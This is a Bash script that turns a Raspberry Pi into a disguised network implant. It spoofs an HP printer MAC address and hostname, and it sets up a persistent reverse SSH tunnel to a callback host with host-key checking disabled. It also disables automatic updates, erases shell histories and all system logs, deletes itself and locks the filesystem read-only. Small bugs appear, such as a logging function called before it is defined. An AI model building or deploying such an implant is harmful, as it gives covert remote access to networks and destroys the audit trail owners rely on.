#!/bin/bash
set -e # Exit on any error

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    log "ERROR" "This script must be run as root (or with sudo)."
    exit 1
fi

CALLBACK_DOMAIN="example.com"
NEW_HOSTNAME="OfficeJet102"
SSH_KEY_PATH="/root/.ssh/id_rsa"
AUTHORIZED_KEYS_PATH="/root/.ssh/authorized_keys"
NEW_MAC="00:30:C1:2B:BA:67" # Make it look like a HP printer MAC
SCRIPT_PATH="$0"            # Get the path to this script

# Define ANSI color codes
COLOR_RESET="\e[0m"
COLOR_INFO="\e[32m"  # Green for INFO
COLOR_ERROR="\e[31m" # Red for ERROR

# Function to log colored messages with timestamps and log levels
log() {
    timestamp=$(date +"%Y-%m-%d %T")
    if [ "$1" == "INFO" ]; then
        echo -e "[$timestamp] ${COLOR_INFO}[INFO] $2${COLOR_RESET}"
    elif [ "$1" == "ERROR" ]; then
        echo -e "[$timestamp] ${COLOR_ERROR}[ERROR] $2${COLOR_RESET}"
    else
        echo -e "[$timestamp] [UNKNOWN] $2"
    fi
}

# Remount partition so we can write /boot/config.txt files for raspi-config
log "INFO" "Remounting partitons as RW..."
mount -o remount,rw /boot/firmware
mount -o remount,rw /

# Modify /boot/cmdline.txt to set the new MAC address
if grep -q "force_mac_address=$NEW_MAC" /boot/config.txt; then
    log "ERROR" "MAC address already set to $NEW_MAC in /boot/config.txt."
else
    log "INFO" "Setting MAC address to $NEW_MAC in /boot/config.txt..."
    echo "force_mac_address=$NEW_MAC" >>/boot/config.txt
fi

# Generate SSH key non-interactively if it doesn't exist
if [ ! -f "$SSH_KEY_PATH" ]; then
    log "INFO" "Generating SSH key pair..."
    ssh-keygen -t rsa -N "" -f "$SSH_KEY_PATH"
    chmod 600 "$SSH_KEY_PATH"
    chmod 644 "$SSH_KEY_PATH.pub"
fi

# Add the generated public key to authorized_keys if not already present
if ! grep -q "$(cat "$SSH_KEY_PATH.pub")" "$AUTHORIZED_KEYS_PATH"; then
    log "INFO" "Adding the public key to authorized_keys..."
    cat "$SSH_KEY_PATH.pub" >>"$AUTHORIZED_KEYS_PATH"
fi

log "INFO" "Updating package list and upgrading installed packages..."
apt update
apt upgrade -y

log "INFO" "Updating the Pi firmware..."
rpi-eeprom-update -a

# This is broken - after it updates it opens the UI and halts the script
# I think it's updated by apt update anyway
# log "INFO" "Updating Raspberry Pi firmware..."
# raspi-config nonint do_update

log "INFO" "Expanding the root filesystem..."
raspi-config nonint do_expand_rootfs

log "INFO" "Setting the hostname..."
raspi-config nonint do_hostname "${NEW_HOSTNAME}"

log "INFO" "Enabling SSH..."
raspi-config nonint do_ssh 0

log "INFO" "Disabling Serial..."
raspi-config nonint do_i2c 1

# log "INFO" "Reducing GPU RAM..."
# raspi-config nonint do_memory_split 16

log "INFO" "Disabling VNC..."
raspi-config nonint do_vnc 1

log "INFO" "Disabling serial..."
raspi-config nonint do_serial 1

systemctl disable --now bluetooth.service
systemctl disable --now avahi-daemon.service
systemctl disable --now avahi-daemon.socket
systemctl disable --now apt-daily-upgrade.service
systemctl disable --now apt-daily-upgrade.timer

# SSH tunnel callback
cat <<EOF >/etc/systemd/system/ssh-cb@.service
[Unit]
Description=SSH
After=network.target

[Service]
ExecStart=/usr/bin/ssh -i "${SSH_KEY_PATH}" -NT -R *:0 -l user "${CALLBACK_DOMAIN}" -p %i -o "StrictHostKeyChecking no"
Restart=always
RestartSec=10
StartLimitInterval=0

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now ssh-cb@22.service

log "INFO" "Clearing bash history..."
find /home /root -type f \( -name ".bash_history" -o -name ".zsh_history" -o -name ".fish_history" \) -exec truncate -s 0 '{}' \;
history -c

log "INFO" "Clearing files in /var/log/..."
find /var/log/ -type f -delete
journalctl --rotate
journalctl --vacuum-time=1s

# Delete this script before making filesystem RO
log "INFO" "Deleting this script..."
rm -f "$SCRIPT_PATH"

log "INFO" "Enabling Overlay Filesystem..." # (Read-only filesystem)
raspi-config nonint do_overlayfs 0          # 0 is enable

log "INFO" "Here is your private key:"
cat "$SSH_KEY_PATH"

log "INFO" "Rebooting the Raspberry Pi..."
reboot
